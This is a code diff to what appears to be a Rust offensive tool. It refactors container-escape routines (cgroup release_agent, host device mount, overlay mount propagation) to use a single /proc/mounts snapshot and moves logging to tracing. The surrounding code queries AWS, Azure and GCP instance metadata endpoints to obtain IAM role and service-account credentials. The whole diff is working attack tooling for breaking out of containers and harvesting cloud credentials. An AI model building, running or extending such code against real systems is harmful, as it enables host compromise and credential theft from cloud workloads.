@@ -268,8 +268,14 @@ pub fn escape_via_cgroup_escape() -> Result<EscapeResult> {
         ));
     }
 
+    // Capture a single atomic snapshot of /proc/mounts so that the host-fs
+    // path lookup does not race with other mount table reads.
+    let snapshot = MountTableSnapshot::capture().context(
+        "container/cgroup: failed to read /proc/mounts for host path detection",
+    )?;
+
     let cgroup_dir = "/tmp/cgrp_escape";
-    let host_path = match get_host_fs_path() {
+    let host_path = match snapshot.find_host_fs_path() {
         Some(p) => p,
         None => {
             return Ok(EscapeResult::fail(
@@ -279,7 +285,17 @@ pub fn escape_via_cgroup_escape() -> Result<EscapeResult> {
         }
     };
 
-    log::info!("container/cgroup: host filesystem path: {host_path}");
+    // Validate the resolved path still exists on disk (defence-in-depth
+    // against a stale snapshot — the mount could have been torn down between
+    // snapshot capture and here).
+    if !Path::new(&host_path).exists() {
+        return Ok(EscapeResult::fail(
+            "cgroup_release",
+            &format!("host filesystem path {host_path} no longer exists on disk"),
+        ));
+    }
+
+    tracing::info!("container/cgroup: host filesystem path: {host_path}");
 
     // Step 1: Create cgroup directory.
     std::fs::create_dir_all(cgroup_dir).context("failed to create cgroup mount point")?;
@@ -407,7 +423,7 @@ pub fn escape_via_device_mount() -> Result<EscapeResult> {
         }
     };
 
-    log::info!("container/device_mount: found host device: {device}");
+    tracing::info!("container/device_mount: found host device: {device}");
 
     let mount_point = "/mnt/host_escape";
     std::fs::create_dir_all(mount_point).context("failed to create mount point")?;
@@ -508,30 +524,26 @@ pub fn escape_via_mount_propagation() -> Result<EscapeResult> {
         ));
     }
 
-    let mounts = std::fs::read_to_string("/proc/mounts").context("failed to read /proc/mounts")?;
-
-    let mut host_lower_dir: Option<String> = None;
-    for line in mounts.lines() {
-        let parts: Vec<&str> = line.split_whitespace().collect();
-        if parts.len() >= 4 && parts[2] == "overlay" {
-            let opts = parts[3];
-            for opt in opts.split(',') {
-                if opt.starts_with("lowerdir=") {
-                    let lower = opt.trim_start_matches("lowerdir=");
-                    if lower.contains("/var/lib/docker/") || lower.contains("/var/lib/containerd/")
-                    {
-                        host_lower_dir = Some(lower.to_string());
-                        break;
-                    }
-                }
-            }
+    // Capture a single atomic snapshot of /proc/mounts so that overlay
+    // lowerdir parsing and host-fs-path lookup operate on the same mount
+    // table, eliminating the TOCTOU window that existed when each operation
+    // opened /proc/mounts independently.
+    let snapshot = match MountTableSnapshot::capture() {
+        Ok(s) => s,
+        Err(e) => {
+            return Ok(EscapeResult::fail(
+                "mount_propagation",
+                &format!("failed to read /proc/mounts: {e}"),
+            ));
         }
-    }
-
-    let host_path = match get_host_fs_path() {
-        Some(p) => Some(p),
-        None => host_lower_dir,
     };
+
+    let lower_dirs = snapshot.find_overlay_lower_dirs();
+    let host_lower_dir = lower_dirs.into_iter().next();
+
+    let host_path = snapshot
+        .find_host_fs_path()
+        .or(host_lower_dir);
 
     match host_path {
         Some(ref hp) => Ok(EscapeResult::ok(
@@ -553,7 +565,7 @@ pub fn escape_via_mount_propagation() -> Result<EscapeResult> {
 
 /// Try all container escape techniques and return the first success.
 pub fn try_all_escapes() -> Result<EscapeResult> {
-    log::info!(
+    tracing::info!(
         "container: attempting escape techniques: device_mount, cgroup_release, mount_propagation"
     );
 
@@ -561,74 +573,159 @@ pub fn try_all_escapes() -> Result<EscapeResult> {
     if result.success {
         return Ok(result);
     }
-    log::debug!("container: device_mount failed: {}", result.message);
+    tracing::debug!("container: device_mount failed: {}", result.message);
 
     let result = escape_via_cgroup_escape()?;
     if result.success {
         return Ok(result);
     }
-    log::debug!("container: cgroup_release failed: {}", result.message);
+    tracing::debug!("container: cgroup_release failed: {}", result.message);
 
     let result = escape_via_mount_propagation()?;
     if result.success {
         return Ok(result);
     }
-    log::debug!("container: mount_propagation failed: {}", result.message);
+    tracing::debug!("container: mount_propagation failed: {}", result.message);
 
     bail!("all container escape techniques failed")
 }
 
-// ── Escape helpers ─────────────────────────────────────────────────────────
+// ── Mount table snapshot (TOCTOU mitigation) ──────────────────────────────
 
-/// Determine the host filesystem path from `/proc/mounts`.
-fn get_host_fs_path() -> Option<String> {
-    let mtab = std::fs::read_to_string("/proc/mounts").ok()?;
-    for line in mtab.lines() {
-        let parts: Vec<&str> = line.split_whitespace().collect();
-        if parts.len() >= 4 {
-            let device = parts[0];
-            let mount_point = parts[1];
-            let fs_type = parts[2];
+/// A single parsed entry from `/proc/mounts`.
+#[derive(Debug, Clone)]
+struct MountEntry {
+    device: String,
+    mount_point: String,
+    fs_type: String,
+    options: String,
+}
 
-            if fs_type == "overlay" {
-                let opts = parts[3];
-                for opt in opts.split(',') {
+/// An immutable snapshot of `/proc/mounts` captured at a single point in time.
+///
+/// All mount-table queries during a container escape attempt are resolved
+/// against the **same** snapshot, eliminating the TOCTOU window that existed
+/// when each helper function opened `/proc/mounts` independently.
+struct MountTableSnapshot {
+    entries: Vec<MountEntry>,
+}
+
+impl MountTableSnapshot {
+    /// Read `/proc/mounts` once and parse every line into a snapshot.
+    fn capture() -> Result<Self> {
+        let raw =
+            std::fs::read_to_string("/proc/mounts").context("failed to read /proc/mounts")?;
+        let mut entries = Vec::new();
+        for line in raw.lines() {
+            let parts: Vec<&str> = line.split_whitespace().collect();
+            if parts.len() >= 4 {
+                entries.push(MountEntry {
+                    device: parts[0].to_string(),
+                    mount_point: parts[1].to_string(),
+                    fs_type: parts[2].to_string(),
+                    options: parts[3].to_string(),
+                });
+            }
+        }
+        Ok(Self { entries })
+    }
+
+    /// Determine the host filesystem path from the snapshot.
+    ///
+    /// This is the snapshot-aware replacement for the old `get_host_fs_path()`
+    /// helper which opened `/proc/mounts` on every call.
+    fn find_host_fs_path(&self) -> Option<String> {
+        // Strategy 1: overlay upperdir.
+        for entry in &self.entries {
+            if entry.fs_type == "overlay" {
+                for opt in entry.options.split(',') {
                     if opt.starts_with("upperdir=") {
                         let upper = opt.trim_start_matches("upperdir=");
                         if let Some(parent) = Path::new(upper).parent() {
                             if let Some(grandparent) = parent.parent() {
                                 let host_root = grandparent.join("merged");
-                                if host_root.exists() {
+                                if Self::path_exists(&host_root) {
                                     return Some(host_root.to_string_lossy().to_string());
                                 }
-                                return Some(parent.to_string_lossy().to_string());
+                                if Self::path_exists(parent) {
+                                    return Some(parent.to_string_lossy().to_string());
+                                }
                             }
                         }
-                        return Some(upper.to_string());
+                        if Self::path_exists(Path::new(upper)) {
+                            return Some(upper.to_string());
+                        }
                     }
                 }
             }
+        }
 
-            if mount_point == "/" && device != "overlay" && !device.starts_with("tmpfs") {
-                if device.starts_with('/') {
-                    return Some(device.to_string());
+        // Strategy 2: root mount on a real block device.
+        for entry in &self.entries {
+            if entry.mount_point == "/"
+                && entry.device != "overlay"
+                && !entry.device.starts_with("tmpfs")
+                && entry.device.starts_with('/')
+            {
+                if Self::path_exists(Path::new(&entry.device)) {
+                    return Some(entry.device.clone());
                 }
             }
         }
-    }
 
-    if let Ok(mtab) = std::fs::read_to_string("/etc/mtab") {
-        for line in mtab.lines() {
-            if line.contains("docker") || line.contains("containerd") {
-                let parts: Vec<&str> = line.split_whitespace().collect();
-                if !parts.is_empty() {
-                    return Some(parts[0].to_string());
+        // Strategy 3: fall back to /etc/mtab for docker/containerd hints.
+        if let Ok(mtab) = std::fs::read_to_string("/etc/mtab") {
+            for line in mtab.lines() {
+                if line.contains("docker") || line.contains("containerd") {
+                    let parts: Vec<&str> = line.split_whitespace().collect();
+                    if let Some(candidate) = parts.first() {
+                        if Self::path_exists(Path::new(candidate)) {
+                            return Some(candidate.to_string());
+                        }
+                    }
                 }
             }
         }
+
+        None
     }
 
-    None
+    /// Extract Docker/containerd overlay lowerdir paths from the snapshot.
+    fn find_overlay_lower_dirs(&self) -> Vec<String> {
+        let mut result = Vec::new();
+        for entry in &self.entries {
+            if entry.fs_type == "overlay" {
+                for opt in entry.options.split(',') {
+                    if opt.starts_with("lowerdir=") {
+                        let lower = opt.trim_start_matches("lowerdir=");
+                        if lower.contains("/var/lib/docker/")
+                            || lower.contains("/var/lib/containerd/")
+                        {
+                            result.push(lower.to_string());
+                        }
+                    }
+                }
+            }
+        }
+        result
+    }
+
+    /// Validate that a path still exists on disk.
+    ///
+    /// Called after resolving a path from the (momentarily stale) snapshot to
+    /// confirm the mount target has not disappeared in the interim.
+    fn path_exists(p: &Path) -> bool {
+        p.exists()
+    }
+}
+
+// ── Escape helpers ─────────────────────────────────────────────────────────
+
+/// Determine the host filesystem path by capturing a fresh mount-table
+/// snapshot and querying it.  This is the public-compatible wrapper used by
+/// call-sites that do not already hold a snapshot.
+fn get_host_fs_path() -> Option<String> {
+    MountTableSnapshot::capture().ok()?.find_host_fs_path()
 }
 
 /// Find the host's root block device by checking common device paths.
@@ -772,7 +869,7 @@ pub async fn detect_cloud_provider() -> Result<Option<CloudProvider>> {
         .await
     {
         if resp.status().is_success() {
-            log::info!("container/cloud: AWS IMDS responded — cloud provider is AWS");
+            tracing::info!("container/cloud: AWS IMDS responded — cloud provider is AWS");
             return Ok(Some(CloudProvider::Aws));
         }
     }
@@ -787,7 +884,7 @@ pub async fn detect_cloud_provider() -> Result<Option<CloudProvider>> {
         .await
     {
         if resp.status().is_success() {
-            log::info!("container/cloud: Azure IMDS responded — cloud provider is Azure");
+            tracing::info!("container/cloud: Azure IMDS responded — cloud provider is Azure");
             return Ok(Some(CloudProvider::Azure));
         }
     }
@@ -800,12 +897,12 @@ pub async fn detect_cloud_provider() -> Result<Option<CloudProvider>> {
         .await
     {
         if resp.status().is_success() {
-            log::info!("container/cloud: GCP IMDS responded — cloud provider is GCP");
+            tracing::info!("container/cloud: GCP IMDS responded — cloud provider is GCP");
             return Ok(Some(CloudProvider::Gcp));
         }
     }
 
-    log::info!("container/cloud: no cloud metadata service responded");
+    tracing::info!("container/cloud: no cloud metadata service responded");
     Ok(None)
 }
 
@@ -842,7 +939,7 @@ pub async fn query_aws_imds() -> Result<AwsCredentials> {
         bail!("no IAM role associated with this instance");
     }
 
-    log::info!("container/aws: IAM role: {role_name}");
+    tracing::info!("container/aws: IAM role: {role_name}");
 
     // Step 3: Get credentials for the role.
     let cred_url =
@@ -906,10 +1003,10 @@ async fn try_aws_imdsv2_token(client: &reqwest::Client) -> Option<String> {
 
     if resp.status().is_success() {
         let token = resp.text().await.ok()?;
-        log::debug!("container/aws: IMDSv2 token obtained");
+        tracing::debug!("container/aws: IMDSv2 token obtained");
         Some(token)
     } else {
-        log::debug!("container/aws: IMDSv2 token request failed, falling back to v1");
+        tracing::debug!("container/aws: IMDSv2 token request failed, falling back to v1");
         None
     }
 }
@@ -1039,32 +1136,32 @@ pub async fn query_all_cloud_metadata() -> Result<Vec<CloudCredential>> {
 
     match query_aws_imds().await {
         Ok(aws) => {
-            log::info!(
+            tracing::info!(
                 "container/cloud: AWS credentials obtained (role: {})",
                 aws.role_name
             );
             creds.push(CloudCredential::Aws(aws));
         }
-        Err(e) => log::debug!("container/cloud: AWS IMDS query failed: {e:#}"),
+        Err(e) => tracing::debug!("container/cloud: AWS IMDS query failed: {e:#}"),
     }
 
     match query_azure_imds().await {
         Ok(azure) => {
-            log::info!("container/cloud: Azure credentials obtained");
+            tracing::info!("container/cloud: Azure credentials obtained");
             creds.push(CloudCredential::Azure(azure));
         }
-        Err(e) => log::debug!("container/cloud: Azure IMDS query failed: {e:#}"),
+        Err(e) => tracing::debug!("container/cloud: Azure IMDS query failed: {e:#}"),
     }
 
     match query_gcp_imds().await {
         Ok(gcp) => {
-            log::info!(
+            tracing::info!(
                 "container/cloud: GCP credentials obtained ({})",
                 gcp.service_account_email
             );
             creds.push(CloudCredential::Gcp(gcp));
         }
-        Err(e) => log::debug!("container/cloud: GCP IMDS query failed: {e:#}"),
+        Err(e) => tracing::debug!("container/cloud: GCP IMDS query failed: {e:#}"),
     }
 
     if creds.is_empty() {
@@ -1115,7 +1212,7 @@ pub struct AzureEnumResult {
 /// Implements AWS SigV4 request signing for API calls without requiring
 /// the AWS SDK.  Signs requests using the provided temporary credentials.
 mod aws_signing {
-    use hmac::{Hmac, Mac};
+    use hmac::{Hmac, KeyInit, Mac};
     use sha2::{Digest, Sha256};
 
     type HmacSha256 = Hmac<Sha256>;
